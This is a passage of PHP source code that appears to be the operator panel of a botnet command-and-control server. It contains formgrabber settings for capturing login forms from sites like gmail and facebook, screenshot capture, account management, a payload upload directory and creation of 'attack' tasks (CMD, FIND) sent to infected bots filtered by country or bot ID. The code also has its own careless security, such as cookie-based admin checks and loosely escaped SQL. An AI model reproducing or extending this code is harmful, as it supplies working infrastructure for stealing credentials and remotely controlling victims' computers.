            '</div>' .
            '<div class="checkbox" style="text-align: left">' .
            '<label>' .
            '&nbsp;<input type="checkbox" ' . $ban_enabled[0] . ' name="enable_ban" value="' . $ban_enabled[0] . '"> Enable ban system' .
            '</label>' .
            '<br>' .
            '<label>' .
            '&nbsp;<input type="checkbox" ' . $scr_enabled[0] . ' name="enable_scr" value="' . $scr_enabled[0] . '"> Take screenshot after run?' .
            '</label>' .
            '</div>' .
            '<input class="btn btn-primary pull-right btn-xs" type="submit" style="margin: 1%;" name="save" value="Change">' .
            '<input name="csrf" type="hidden" value="' . $_SESSION["csrf"] . '">' .
            '</form>';
    }

    if ($do == 'accountlist') {
        if ($_COOKIE['uid'] != 'admin') {
            die('Not allowed');
        }

        if (array_key_exists('delete_account', $_GET)) {
            if ($_SESSION['csrf'] != $_GET['csrf']) {
                return;
            }

            $del_account = htmlspecialchars(addslashes($_GET['delete_account']));
            if ($del_account != 'admin') {
                $mysqli->query("DELETE FROM users WHERE username='" . $del_account . "'");
            }
            MessageRedirect($account_list);
        }
        if (isset($_POST['add_new_account'])) {
            if ($_SESSION['csrf'] != $_POST['csrf']) {
                return;
            }
            register($mysqli, $_POST['username'], $_POST['password']);
        }

        echo '<form method="post" action="">' .
            '<div class="input-group">' .
            '<span class="input-group-addon">Username :</span>' .
            '<input class="form-control" type="text" id="username" class="form-control" name="username">' .
            '</div>' .
            '<div class="input-group">' .
            '<span class="input-group-addon">Password :&nbsp;</span>' .
            '<input class="form-control" type="text" id="password" class="form-control" name="password">' .
            '</div>' .
            '<br>' .
            '<input style="margin: 1%;" class="btn btn-xs btn-primary pull-right" type="submit" name="add_new_account" value="Add account">' .
            '<input name="csrf" type="hidden" value="' . $_SESSION["csrf"] . '">' .
            '</form>' .
            '<br>';

        $res = $mysqli->query('SELECT * FROM users');
        if ($res->num_rows != 0) {
            echo '<br><table class="table table-condensed table-hover">' .
                '<tr>' .
                '<th style="text-align: center">#</th>' .
                '<th>Username</th>' .
                '<th>Password</th>' .
                '<th style="text-align: left">Type</th>' .
                '<th style="text-align: center">Action</th>' .
                '</tr><tbody>';

            for ($i = 0; $i < $res->num_rows; $i++) {
                $row = $res->fetch_assoc();
                echo '<tr>' .
                    '<td style="text-align: center"><b>' . $i . '</td>' .
                    '<td>' . $row['username'] . '</td>' .
                    '<td>*******************</td>';

                if ($row['uid'] == 'admin')
                    echo "<td style=\"text-align: left;vertical-align:middle;\"><span class='label label-danger'><i>" . $row['uid'] . "</i></span></td><td></td>";

                else {
                    echo "<td style=\"text-align: left;vertical-align:middle;\"><span class='label label-default'><i>" . $row['uid'] . "</i></span></td>";
                    echo "<td style=\"text-align: center\"><a href = \"?act=settings&do=accountlist&delete_account=" . urlencode($row["username"]) . "&csrf=" . $_SESSION["csrf"] . "\" title='Delete account'><span class='glyphicon glyphicon-trash'></a></td>";
                }
                echo '</tr>';
            }
            echo '</tbody></table>';
        }

    }
    if ($do == 'blacklist') {
        if (array_key_exists('delete_ip', $_GET)) {
            $delip = htmlspecialchars(addslashes($_GET['delete_ip']));
            QueryRedirect($mysqli, "DELETE FROM banned WHERE ip='" . $delip . "'", $black_list);
        }

        if (array_key_exists('addban', $_POST)) {
            if ($_SESSION['csrf'] != $_POST['csrf']) {
                return;
            }

            if (filter_var($_POST['banip'], FILTER_VALIDATE_IP)) {
                $ban_ip = $_POST['banip'];
                $reason = htmlspecialchars(addslashes($_POST['banreason']));
                QueryRedirect($mysqli, "REPLACE INTO banned (ip, useragent, ref, reason) VALUES ('$ban_ip', 'NULL', 'NULL', '$reason')", $black_list);
            } else {
                echo '<script type="text/javascript">bootbox.alert("Wrong IP address!");</script>';
            }
        }

        echo '<form method="POST" action="">' .
            '<div class="input-group">' .
            '<span class="input-group-addon">IP Addr :</span>' .
            '<input type="text" id="banip" class="form-control" name="banip">' .
            '</div>' .
            '<div class="input-group">' .
            '<span class="input-group-addon">Reason :</span>' .
            '<input type="text" id="banreason" maxlength="50" class="form-control" name="banreason">' .
            '</div>' .
            '<br>' .
            '<input style="margin: 1%;" class="btn btn-xs btn-primary pull-right" type="submit" name="addban" value="Add ban">' .
            '<input name="csrf" type="hidden" value="' . $_SESSION["csrf"] . '">' .
            '</form>';

        $banned_ip = null;
        $res = $mysqli->query('SELECT * FROM banned');
        if ($res) {
            if ($res->num_rows != 0) {
                $gi = geoip_open('GeoIP/GeoIP.dat', GEOIP_STANDARD);
                echo '<br><table class="table table-condensed table-hover">' .
                    '<tr>' .
                    '<th>#</th>' .
                    '<th>Country</th>' .
                    '<th>IP</th>' .
                    '<th>Reason</th>' .
                    '<th style="text-align: center">Action</th>' .
                    '<tr><tbody>';

                for ($i = 0; $i < $res->num_rows; $i++) {
                    $row = $res->fetch_assoc();

                    $bot_cn = geoip_country_code_by_addr($gi, $row['ip']);
                    if ($bot_cn == null) {
                        $bot_cn = 'O1';
                    }

                    echo '<tr><td style="width: 5%"><b>' . $i . '</td>' .
                        '<td style="vertical-align:middle;">' . ShowFlag($bot_cn, $country_array[$bot_cn]) . " " . $country_array[$bot_cn] . '</td>' .
                        '<td style="width: 20%">' . $row['ip'] . '</td>' .
                        '<td style="width: 50%">' . $row['reason'] . '</td>' .
                        '<td style="text-align: center;"><a href = "?act=settings&do=blacklist&delete_ip=' . urlencode($row['ip']) . '" title=Delete><span class="glyphicon glyphicon-trash"></a></td></tr>';
                }
                geoip_close($gi);
                echo '</tbody></table>';
            }
        }
    }
    if ($do == 'ffsettings') {
        $ff_enabled = $mysqli->query('SELECT name FROM admin_config WHERE id = 2')->fetch_object()->name;
        $hostnames = $mysqli->query('SELECT hostnames FROM formgrabber_host')->fetch_object()->hostnames;
        $blacklisted_hostnames = $mysqli->query('SELECT block FROM formgrabber_host')->fetch_object()->block;

        if (array_key_exists('save', $_POST)) {
            if ($_SESSION['csrf'] != $_POST['csrf']) {
                return;
            }
            if (array_key_exists('ff_enable', $_POST)) {
                $mysqli->query("UPDATE admin_config SET name='checked' WHERE id = 2");
            } else {
                $mysqli->query("UPDATE admin_config SET name='' WHERE id = 2");
            }

            $mysqli->query("UPDATE formgrabber_host SET block='" . $mysqli->real_escape_string($_POST['blacklisted']) . "'");
            $mysqli->query("UPDATE formgrabber_host SET hostnames='" . $mysqli->real_escape_string($_POST['hostnames']) . "'");
            MessageRedirect($ff_setting);
        }

        echo ' <form method="POST" action="">'
            . '<div class="checkbox">'
            . '<label>'
            . '<input type="checkbox" name="ff_enable" value="ff_enable" ' . $ff_enabled . ' >Enable formgrabber </label>'
            . '</div>'
            . '<div class="input-group">'
            . '<span class="input-group-addon"> Filter : </span>'
            . '<input type="text" class="form-control" id="hostnames" name="hostnames" value="' . $hostnames . '">'
            . '<span class="input-group-addon"><a href="#" onclick="bootbox.alert(\'Type capture_all for disable filter and grabbing requests from all hosts.<br>If you want grab requests from specific hosts, just type hostnames, example : gmail,facebook,ebay\');return false;"><span class="glyphicon glyphicon-question-sign"></span></a></span>'
            . '</div>'
            . '<div class="form-group">'
            . '<label for="blacklisted">Blacklist :</label>'
            . '<textarea class="form-control" rows="1" cols="70" onfocus="this.rows = 9" onblur="this.rows = 1" name="blacklisted">' . $blacklisted_hostnames . '</textarea>'
            . '</div>'
            . '<div style="text-align: right">'
            . '<input type="submit" style="text-align: center;margin: 1%;" name="save" class="btn btn-xs btn-primary" value="Save settings">'
            . '<input name="csrf" type="hidden" value="' . $_SESSION['csrf'] . '">'
            . '</div>'
            . '</form>';
    }
}
if ($act == 'upload') {

    $uploads_dir = 'upload';
    if (count($_FILES) != 0) {
        if ($_SESSION['csrf'] != $_POST['csrf']) {
            return;
        }

        foreach ($_FILES['upfiles']['error'] as $key => $error) {
            if ($error == UPLOAD_ERR_OK) {
                $tmp_name = $_FILES['upfiles']['tmp_name'][$key];
                $name = $_FILES['upfiles']['name'][$key];
                move_uploaded_file($tmp_name, "$uploads_dir/$name");
                chmod("$uploads_dir/$name", 0644);
                MessageRedirect($upload_files);
            }
        }
    }

    $dir = opendir($uploads_dir);
    $files = scandir($uploads_dir);
    while ($file = readdir($dir)) {
        if ($file != '.' && $file != '..' && $file != 'index.html' && $file != 'index.php' && $file != '.htaccess') {
            $arr_files[] = iconv('windows-1251', 'UTF-8', $file);
            $arr_sizes[] = filesize($uploads_dir . '/' . $file);
            $arr_datetime[] = date('Y-m-d H:i:s', filemtime($uploads_dir . '/' . $file));
        }
    }


    $count = isset($arr_files) ? count($arr_files) : 0;
    echo '<div class="panel panel-primary" style="width: 80%;margin: 0 auto;overflow: hidden;">' .
        '<div class="panel-heading"><b>Upload  (' . count($arr_files) . ') </b></div>' .
        '<div class="panel-body">' .
        '<form action="" method="POST" enctype="multipart/form-data">' .
        '<input type="file" class="file-loading" id="upfiles" name="upfiles[]" data-show-preview="false">' .
        '<input name="csrf" type="hidden" value="' . $_SESSION['csrf'] . '">' .
        '</form></div>' .
        '<script>' .
        '$("#upfiles").fileinput();' .
        '</script>';


    if ($count <= 0) {
        die('<div style="margin: 0 auto;overflow: hidden;text-align: center"><b>No files in directory!</b></div>');
    }

    if (array_multisort($arr_datetime, SORT_DESC, $arr_sizes, $arr_files)) {
        echo '<table class="table table-responsive table-striped table-condensed table-hover">' .
            '<th style="text-align: center" width="5%"> # </th>' .
            '<th width="65%">Filename</th>' .
            '<th width="15%"> Date </th>' .
            '<th width="10%"> Size </th>' .
            '<th width="5%"> Action </th>' .
            '<tbody>';

        for ($w = 0; $w < $count; $w++) {

            if ($arr_sizes[$w] >= 1024) {
                $fsstr = sprintf('%1.2f', $arr_sizes[$w] / 1024) . ' KB';
            } else {
                $fsstr = $arr_sizes[$w] . ' B';
            }

            $file_path = $main_url . 'upload/' . $arr_files[$w];
            echo '<tr class="active">' .
                '<td style="text-align: center" width="5%"><b>' . $w . '</b></td>' .
                '<td  width="65%" style="text-align: left"><input size="100" style="background-color:transparent !important;border:none !important;" onclick="this.select();" type="text"
                    value="' . $file_path . '" /> ' .
                '<td width="15%" style="text-align: left">' . $arr_datetime[$w] . '</td>' .
                '<td width="10%" style="text-align: left">' . $fsstr . '</td>' .
                '<td width="5%"><a href="' . $uploads_dir . '/' . $arr_files[$w] . '" title = "Download"><span class="glyphicon glyphicon-save"></span></a>' .
                '<a href="' . $_SERVER['PHP_SELF'] . '?act=' . $uploads_dir . '&delete=' . $arr_files[$w] . '" title = "Delete"><span class="glyphicon glyphicon-trash"></span></a></td>' .
                '</tr>';
        }
        echo '</tbody>' .
            '</table> ';
    }
    echo '</div></div></div>';
    closedir($dir);

    if (!empty($_GET['delete'])) {

        $file = iconv('utf-8', 'cp1251', $uploads_dir . '/' . $_GET['delete']);
        if (file_exists($file)) {
            chmod($file, 0666);
            unlink($file);
        }
        MessageRedirect($upload_files);
    }
}
if (array_key_exists('create_task', $_POST)) {

    if ($_SESSION['csrf'] != $_POST['csrf']) {
        return;
    }

    $user = $_COOKIE['uid'];
    $urls = htmlspecialchars(addslashes($_POST['urls']));
    $type_attack = EncodeCommand($_POST['type_attack']);

    if ($type_attack == 'FIND' || $type_attack == 'CMD') {
        $urls = urlencode($urls);
        $urls = str_replace('+', ' ', $urls);
    }

    $bots = !empty($_POST['bot_uid']) ? 'ID:' . $_POST['bot_uid'] : $_POST['country'];
    $execs = !empty($_POST['execs']) ? addslashes($_POST['execs']) : '0';
    $build_id = !empty($_POST['build_id']) ? addslashes($_POST['build_id']) : 'NONE';

    $task_id = time() . mt_rand(111111, 999999);
    $task_date = date('Y-m-d H:i:s');

    $task_pref = $adelim . $type_attack . ' ';
    $task_postf = $adelim;

    $sql = 'INSERT INTO botnet_tasks (task_id, task_date, tasks_pref, command, tasks_postf, status, by_user, execs, needexecs, given, failed, bots, build_id) ' .
        "VALUES ('$task_id', '$task_date', '$task_pref', '$urls', '$task_postf', 1, '$user', 0, '$execs', 0, 0, '$bots', '$build_id')";

    QueryRedirect($mysqli, $sql, $tasks_url);

}
if ($act == 'logout') {
    session_destroy();
    echo '<script>Logout();</script>';
}
echo '</body></html>';
$mysqli->close();